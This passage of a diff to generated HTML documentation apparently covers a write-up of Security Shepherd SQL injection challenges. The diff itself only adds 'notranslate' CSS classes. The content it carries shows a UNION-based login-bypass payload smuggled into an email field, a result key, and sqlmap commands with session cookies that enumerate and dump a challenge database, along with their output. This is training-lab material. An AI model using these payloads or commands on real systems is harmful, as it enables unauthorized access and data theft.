-<p>Although the write up is short, the amount of time finding the solution was not insignificant. First, there are some restrictions on the length of the inputs that make using <strong class="program">sqlmap</strong> challenging. Although the email address is actually checked, that’s not too much of a restriction as something on the order of <code class="docutils literal"><span class="pre">&quot;bunch</span> <span class="pre">of</span> <span class="pre">junk&quot;&#64;x</span></code> passes for a legal email address. If the SQL injection is in the email address then we want a true out of the email address check with the password being ignored.</p>
-<p>Attempts using email of <code class="docutils literal"><span class="pre">&quot;'||1#&quot;&#64;x</span></code> with password <code class="docutils literal"><span class="pre">password</span></code> didn’t work. The email addressed was legal but the <code class="docutils literal"><span class="pre">#</span></code> didn’t comment out the rest of the SQL query. If it did, the <code class="docutils literal"><span class="pre">||1</span></code> should have returned a true value and presumably success.</p>
-<p>Another way to nullify the effect of the rest of the SQL query is to insert a UNION statement at the end of the email input. We’ll need a table for the UNION query and we guess there’s a users table. Trying email <code class="docutils literal"><span class="pre">&quot;'||1</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">FROM</span> <span class="pre">users</span> <span class="pre">WHERE</span> <span class="pre">'1'='&quot;&#64;x</span></code> with password <code class="docutils literal"><span class="pre">password</span></code> works. Note that the first part of the UNION statement WHERE clause is false; the password field should be joined to it by an AND, making the UNION statement return nothing. So the overall query should return true for the first user.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Welcome User 1</span>
+<p>Although the write up is short, the amount of time finding the solution was not insignificant. First, there are some restrictions on the length of the inputs that make using <strong class="program">sqlmap</strong> challenging. Although the email address is actually checked, that’s not too much of a restriction as something on the order of <code class="docutils literal notranslate"><span class="pre">&quot;bunch</span> <span class="pre">of</span> <span class="pre">junk&quot;&#64;x</span></code> passes for a legal email address. If the SQL injection is in the email address then we want a true out of the email address check with the password being ignored.</p>
+<p>Attempts using email of <code class="docutils literal notranslate"><span class="pre">&quot;'||1#&quot;&#64;x</span></code> with password <code class="docutils literal notranslate"><span class="pre">password</span></code> didn’t work. The email addressed was legal but the <code class="docutils literal notranslate"><span class="pre">#</span></code> didn’t comment out the rest of the SQL query. If it did, the <code class="docutils literal notranslate"><span class="pre">||1</span></code> should have returned a true value and presumably success.</p>
+<p>Another way to nullify the effect of the rest of the SQL query is to insert a UNION statement at the end of the email input. We’ll need a table for the UNION query and we guess there’s a users table. Trying email <code class="docutils literal notranslate"><span class="pre">&quot;'||1</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">FROM</span> <span class="pre">users</span> <span class="pre">WHERE</span> <span class="pre">'1'='&quot;&#64;x</span></code> with password <code class="docutils literal notranslate"><span class="pre">password</span></code> works. Note that the first part of the UNION statement WHERE clause is false; the password field should be joined to it by an AND, making the UNION statement return nothing. So the overall query should return true for the first user.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Welcome User 1</span>
 </span>
 <span class="hll"><span class="go">The result key for this level is</span>
 </span><span class="hll"><span class="go">okhRdaJDUkykc88PGBgLG008zQt/LTKlkSad+cur6cHQ6DlkGPs4miMh3x0YeMyQynuR9ZoLrP4n4xToWx6HNM40A4pRvfR+VlYvE0LNDm/1B9ucoeJXtDt3UQr/RmUOen148gH25Qzykx66jwvmhw==</span>
@@ -641,7 +641,7 @@ available databases [2]:
 <div class="section" id="sql-injection-stored-procedure">
 <h2>3.15.5.9. SQL Injection Stored Procedure<a class="headerlink" href="#sql-injection-stored-procedure" title="Permalink to this headline">¶</a></h2>
 <p>For this SQL injection we’ll rely on <strong class="program">sqlmap</strong>.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
 <span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
 <span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7&#39;</span>
 <span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;userIdentity=*&#39;</span>
@@ -658,7 +658,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">sqlmap identified the following injection point(s) with a total of 1377 HTTP(s) requests:</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sqlmap identified the following injection point(s) with a total of 1377 HTTP(s) requests:</span>
 <span class="go">---</span>
 <span class="go">Parameter: #1* ((custom) POST)</span>
 <span class="go">    Type: error-based</span>
@@ -684,7 +684,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </span></pre></div>
 </div>
 <p>Next determine tables in database SqlChalStoredProc:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
     --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
     --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
@@ -694,7 +694,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalStoredProc</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalStoredProc</span>
 <span class="go">[1 table]</span>
 <span class="go">+-----------+</span>
 <span class="hll"><span class="go">| customers |</span>
@@ -702,7 +702,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </pre></div>
 </div>
 <p>Next dump the table customers:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
     --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
     --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
@@ -712,7 +712,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalStoredProc</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalStoredProc</span>
 <span class="go">Table: customers</span>
 <span class="go">[4 entries]</span>
 <span class="go">+------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+</span>
